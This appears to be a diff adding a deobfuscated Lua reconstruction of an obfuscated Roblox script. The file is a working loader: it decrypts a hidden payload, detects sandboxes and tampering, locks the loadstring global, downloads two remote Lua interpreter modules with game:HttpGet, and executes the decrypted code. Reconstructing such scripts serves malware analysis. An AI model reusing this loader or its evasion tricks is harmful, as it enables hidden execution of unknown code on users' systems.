@@ -1,0 +1,177 @@
+-- Deobfuscated reconstruction of attachment 1, the ASCII-banner Lua script.
+-- Local names describe the recovered bytecode. The two remote Lua modules
+-- are referenced by URL in the attachment and their source is external.
+
+local function fromHex(hex)
+    local bytes = {}
+    for index = 1, #hex, 2 do
+        local value = tonumber(hex:sub(index, index + 1), 16)
+        bytes[#bytes + 1] = string.char(value)
+    end
+    return table.concat(bytes)
+end
+
+local function checksum(hex, key)
+    local value = tonumber(key) or 42
+    for index = 1, #hex do
+        value = bit32.bxor(value, string.byte(hex, index) or 0)
+        value = (value * 31 + index * 997) % 4294967295
+    end
+    return string.format("%08x", value)
+end
+
+local function makeKeyStream(key, count)
+    local stream = {}
+    local keyText = tostring(key)
+    local state = 0
+
+    for index = 1, count do
+        local firstIndex = (index % #keyText) + 1
+        local firstByte = string.byte(keyText, firstIndex) or 0
+        state = (state * 31 + firstByte + index * 997) % 256
+
+        local secondIndex = ((index * firstByte + state) % #keyText) + 1
+        local secondByte = string.byte(keyText, secondIndex) or 0
+        local mixed = bit32.bxor(secondByte, state, index % 256)
+        stream[index] = (mixed + index * 7) % 256
+    end
+
+    return stream
+end
+
+local function decrypt(packet, key)
+    if #packet < 8 then
+        return ""
+    end
+
+    local tag = packet:sub(-8)
+    local hex = packet:sub(1, -9)
+    if tag ~= checksum(hex, key) then
+        return ""
+    end
+
+    local ciphertext = fromHex(hex)
+    local count = #ciphertext
+    if count == 0 then
+        return ""
+    end
+
+    local stream = makeKeyStream(key, count * 3)
+    local bytes = {}
+    for index = 1, count do
+        local value = string.byte(ciphertext, index)
+        bytes[index] = string.char((value - index * 3 - stream[count + index]) % 256)
+    end
+
+    local carry = 0
+    for index = 1, count do
+        local value = bit32.bxor(string.byte(bytes[index]), carry)
+        carry = (carry + value) % 256
+        bytes[index] = string.char(value)
+    end
+
+    for index = 1, count do
+        bytes[index] = string.char(bit32.bxor(string.byte(bytes[index]), stream[index]))
+    end
+
+    return table.concat(bytes)
+end
+
+local module = {}
+local environment = (getfenv and getfenv(0)) or _G
+local savedLoadstring = environment.loadstring
+
+if type(savedLoadstring) ~= "function"
+    or tostring(savedLoadstring):find("print")
+    or tostring(savedLoadstring):find("0x0") then
+    savedLoadstring = nil
+end
+
+setmetatable(_G, {
+    __newindex = function(globals, name, value)
+        if name == "loadstring" then
+            return
+        end
+        rawset(globals, name, value)
+    end,
+})
+
+local function getCompiler()
+    if not savedLoadstring then
+        return function()
+            return function() end
+        end
+    end
+
+    return function(source)
+        if not source or source == "" then
+            return function() end
+        end
+
+        local chunk, err = savedLoadstring(source)
+        if not chunk or err then
+            return function() end
+        end
+        return chunk
+    end
+end
+
+function give()
+    return _G.z or "sandbox"
+end
+
+local key = give()
+
+local function loadRemoteModule(url)
+    return loadstring(game:HttpGet(url))()
+end
+
+function module.l(packet)
+    local probePassed = pcall(function()
+        return loadstring('return "https://erisyph.neocities.org/?gid=OBFUSCATOR_DECRYPTOR"')()
+    end)
+
+    if key == "sandbox" or #key < 30 then
+        warn("Jarvis, clip that lelll.")
+        return
+    end
+
+    if not probePassed then
+        warn("Jarvis, clip that lollll.")
+        return
+    end
+
+    local source = decrypt(packet, key)
+    if not source or source == "" then
+        warn("Jarvis, clip that lollll.")
+        return
+    end
+
+    game:GetService("HttpService")
+    getCompiler()
+
+    local yueliang = loadRemoteModule(
+        "https://raw.githubusercontent.com/LinoriaLib/FioneLua/refs/heads/main/Loadstring/Yueliang.lua"
+    )
+    local fione = loadRemoteModule(
+        "https://raw.githubusercontent.com/LinoriaLib/FioneLua/refs/heads/main/Loadstring/Fione.lua"
+    )
+
+    function whatever(sourceText, env)
+        env = env or getfenv()
+        local name = (env.script and env.script:GetFullName()) or "unnamed"
+        local result
+        local success, err = pcall(function()
+            result = fione(yueliang(sourceText, name), env)
+        end)
+        if success then
+            return result
+        end
+        return nil, err
+    end
+
+    fn = whatever(source)
+    fn()
+end
+
+return module
